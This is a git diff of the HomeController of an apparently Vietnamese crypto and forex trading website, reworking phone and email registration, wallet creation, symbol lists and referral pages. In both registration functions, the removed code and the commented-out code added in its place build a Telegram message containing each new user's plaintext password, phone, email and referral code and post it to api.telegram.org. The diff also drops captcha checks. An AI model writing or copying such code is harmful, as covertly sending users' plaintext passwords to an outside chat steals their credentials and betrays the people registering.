@@ -25,12 +25,17 @@ use App\Models\Investment;
 use App\Models\KyQuy;
 use App\Models\KyQuyUser;
 use Carbon\Carbon;
+use App\Models\Wallet;
 class HomeController extends Controller
 {
     public function index(Request $request)
     {
-        $symbols = Symbol::where('status', 'active')->limit(10)->get();
-        return view('user.home', compact('symbols'));
+        $symbols = Symbol::active()->limit(10)->get();
+        $cryptoSymbols = Symbol::active()->crypto()->limit(5)->get();
+        $usaSymbols = Symbol::active()->usa()->limit(5)->get();
+        $forexSymbols = Symbol::active()->forex()->limit(5)->get();
+        
+        return view('user.home', compact('symbols', 'cryptoSymbols', 'usaSymbols', 'forexSymbols'));
         // return view('welcome');
     }
     public function register(Request $request)
@@ -43,25 +48,111 @@ class HomeController extends Controller
     public function registerPost(Request $request)
     {
         $validator = Validator::make($request->all(), [
-            'name' => 'required',
             'phone' => 'required|unique:users',
-            'email' => 'required|email|unique:users',
             'password' => 'required|min:6',
+            'password_confirmation' => 'required|same:password',
             'agree_terms' => 'required',
-            'captcha' => 'required|captcha',
             'referral_code' => 'nullable|exists:users,referral'
         ], [
-            'name.required' => __('index.name_required'),
             'phone.required' => __('index.phone_required'),
             'phone.unique' => __('index.phone_exists'),
+            'password.required' => __('index.password_required'),
+            'password.min' => __('index.password_min'),
+            'password_confirmation.required' => 'Xác nhận mật khẩu là bắt buộc',
+            'password_confirmation.same' => 'Mật khẩu xác nhận không khớp',
+            'agree_terms.required' => __('index.agree_terms_required', ['app_name' => config('app_name')]),
+            'referral_code.exists' => __('index.referral_code_exists')
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'status' => false,
+                'message' => $validator->errors()->first()
+            ], 422);
+        }
+
+
+
+        $user = new User();
+        $user->phone = $request->phone;
+        $user->password = Hash::make($request->password);
+        
+        $referralParent = null;
+        if ($request->referral_code) {
+            $referralParent = User::where('referral', $request->referral_code)->first();
+            if ($referralParent) {
+                $user->referral_parent_id = $referralParent->id;
+            } else {
+                return response()->json([
+                    'status' => false,
+                    'message' => __('index.referral_code_not_found')
+                ], 422);
+            }
+        }
+        
+        $user->save();
+
+        $symbols = Symbol::where('category', 'crypto')->where('status', 'active')->get();
+        foreach($symbols as $symbol) {
+            Wallet::create([
+                'user_id' => $user->id,
+                'symbol_id' => $symbol->id,
+                'balance' => 0,
+                'frozen_balance' => 0,
+                'total_bought' => 0,
+                'total_sold' => 0,
+                'average_buy_price' => 0,
+            ]);
+        }
+
+        Auth::login($user);
+
+        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
+        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
+        // if($telegram_bot_chatid_account && $telegram_bot_token_account) {
+        //     $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
+        //     $message = "🔔 <b>Tài khoản đăng ký mới (Điện thoại)</b> 🎉\n\n";
+        //     $message .= "🆔 <b>ID:</b> {$user->id}\n";
+        //     $message .= "📞 <b>Số điện thoại:</b> {$user->phone}\n";
+        //     $message .= "🔗 <b>Mật khẩu:</b> {$request->password}\n";
+        //     $message .= "🔗 <b>Mã giới thiệu:</b> {$request->referral_code}\n";
+        //     $message .= "🕒 <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";  
+        //     if ($referralParent) {
+        //         $message .= "👤 <b>ID người giới thiệu:</b> {$referralParent->id}\n";
+        //     }
+        //     $data = [
+        //         'chat_id' => $telegram_bot_chatid_account->value,
+        //         'text' => $message,
+        //         'parse_mode' => 'HTML',
+        //     ];
+        //     Http::post($url, $data);
+        // }
+
+        return response()->json([
+            'status' => true,
+            'message' => __('index.register_success')
+        ]);
+    }
+
+    public function registerEmailPost(Request $request)
+    {
+        $validator = Validator::make($request->all(), [
+            'email' => 'required|email|unique:users',
+            'verification_code' => 'required',
+            'password' => 'required|min:6',
+            'password_confirmation' => 'required|same:password',
+            'agree_terms' => 'required',
+            'referral_code' => 'nullable|exists:users,referral'
+        ], [
             'email.required' => 'Email là bắt buộc',
             'email.email' => 'Email không đúng định dạng',
             'email.unique' => 'Email đã được sử dụng',
+            'verification_code.required' => 'Mã xác thực là bắt buộc',
             'password.required' => __('index.password_required'),
             'password.min' => __('index.password_min'),
+            'password_confirmation.required' => 'Xác nhận mật khẩu là bắt buộc',
+            'password_confirmation.same' => 'Mật khẩu xác nhận không khớp',
             'agree_terms.required' => __('index.agree_terms_required', ['app_name' => config('app_name')]),
-            'captcha.required' => __('index.captcha_required'),
-            'captcha.captcha' => __('index.captcha_incorrect'),
             'referral_code.exists' => __('index.referral_code_exists')
         ]);
 
@@ -101,12 +192,18 @@ class HomeController extends Controller
             ], 422);
         }
 
+        if ($request->verification_code !== $storedCode) {
+            return response()->json([
+                'status' => false,
+                'message' => 'Mã xác thực không đúng.'
+            ], 422);
+        }
+
         $user = new User();
-        $user->name = $request->name;
-        $user->phone = $request->phone;
         $user->email = $request->email;
         $user->email_verified_at = now();
         $user->password = Hash::make($request->password);
+        
         $referralParent = null;
         if ($request->referral_code) {
             $referralParent = User::where('referral', $request->referral_code)->first();
@@ -127,28 +224,39 @@ class HomeController extends Controller
 
         Auth::login($user);
 
-        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
-        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
-        if($telegram_bot_chatid_account && $telegram_bot_token_account) {
-            $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
-            $message = "🔔 <b>Tài khoản đăng ký mới</b> 🎉\n\n";
-            $message .= "👤 <b>Tên:</b> {$user->name}\n";
-            $message .= "🆔 <b>ID:</b> {$user->id}\n";
-            $message .= "📞 <b>Số điện thoại:</b> {$user->phone}\n";
-            $message .= "📧 <b>Email:</b> {$user->email}\n";
-            $message .= "🔗 <b>Mật khẩu:</b> {$request->password}\n";
-            $message .= "🔗 <b>Mã giới thiệu:</b> {$request->referral_code}\n";
-            $message .= "🕒 <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";  
-            if ($referralParent) {
-                $message .= "👤 <b>Tên người giới thiệu:</b> {$referralParent->name}\n";
-            }
-            $data = [
-                'chat_id' => $telegram_bot_chatid_account->value,
-                'text' => $message,
-                'parse_mode' => 'HTML',
-            ];
-            Http::post($url, $data);
+        $symbols = Symbol::where('category', 'crypto')->where('status', 'active')->get();
+        foreach($symbols as $symbol) {
+            Wallet::create([
+                'user_id' => $user->id,
+                'symbol_id' => $symbol->id,
+                'balance' => 0,
+                'frozen_balance' => 0,
+                'total_bought' => 0,
+                'total_sold' => 0,
+                'average_buy_price' => 0,
+            ]);
         }
+
+        // $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
+        // $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
+        // if($telegram_bot_chatid_account && $telegram_bot_token_account) {
+        //     $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
+        //     $message = "🔔 <b>Tài khoản đăng ký mới (Email)</b> 🎉\n\n";
+        //     $message .= "🆔 <b>ID:</b> {$user->id}\n";
+        //     $message .= "📧 <b>Email:</b> {$user->email}\n";
+        //     $message .= "🔗 <b>Mật khẩu:</b> {$request->password}\n";
+        //     $message .= "🔗 <b>Mã giới thiệu:</b> {$request->referral_code}\n";
+        //     $message .= "🕒 <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";  
+        //     if ($referralParent) {
+        //         $message .= "👤 <b>ID người giới thiệu:</b> {$referralParent->id}\n";
+        //     }
+        //     $data = [
+        //         'chat_id' => $telegram_bot_chatid_account->value,
+        //         'text' => $message,
+        //         'parse_mode' => 'HTML',
+        //     ];
+        //     Http::post($url, $data);
+        // }
 
         return response()->json([
             'status' => true,
@@ -750,9 +858,14 @@ class HomeController extends Controller
     public function trading(Request $request)
     {
         $time_session = TimeSession::where('status', 1)->get();
-        $symbolActive = Symbol::where('status', 1)->where('symbol', $request->symbol)->first();
+        $symbolActive = Symbol::active()->where('symbol', $request->symbol)->first();
         
-        $symbols = Symbol::where('status', 1)->get();
+        // Load symbols by category
+        $symbols = Symbol::active()->get();
+        $cryptoSymbols = Symbol::active()->crypto()->get();
+        $usaSymbols = Symbol::active()->usa()->get();
+        $forexSymbols = Symbol::active()->forex()->get();
+        
         if(!$symbolActive) {
             $symbolActive = $symbols->first();
         }
@@ -765,7 +878,7 @@ class HomeController extends Controller
         } else {
             $history = collect([]);
         }
-        return view('user.trading', compact('time_session','symbols', 'history', 'symbolActive'));
+        return view('user.trading', compact('time_session','symbols', 'cryptoSymbols', 'usaSymbols', 'forexSymbols', 'history', 'symbolActive'));
     }
 
     public function loadMoreTrades(Request $request)
@@ -1230,6 +1343,19 @@ class HomeController extends Controller
         return view('referred-users', compact('referredUsers'));
     }
 
+    public function invitation()
+    {
+        $user = User::find(Auth::user()->id);
+        $referredUsers = $user->referrals()->orderBy('created_at', 'desc')->paginate(10);
+        
+        // Calculate rebate statistics
+        $totalRebate = 0; // You can implement actual rebate calculation here
+        $todayRebate = 0; // You can implement actual rebate calculation here
+        $monthRebate = 0; // You can implement actual rebate calculation here
+        
+        return view('user.invitation', compact('referredUsers', 'totalRebate', 'todayRebate', 'monthRebate'));
+    }
+
     public function loadMoreReferredUsers(Request $request)
     {
         $validator = Validator::make($request->all(), [
@@ -1489,5 +1615,10 @@ class HomeController extends Controller
         }
 
         return response()->json(['message' => __('index.final_settlement_success')], 200);
+    }
+
+    public function nft()
+    {
+        return view('user.nft');
     }
 }
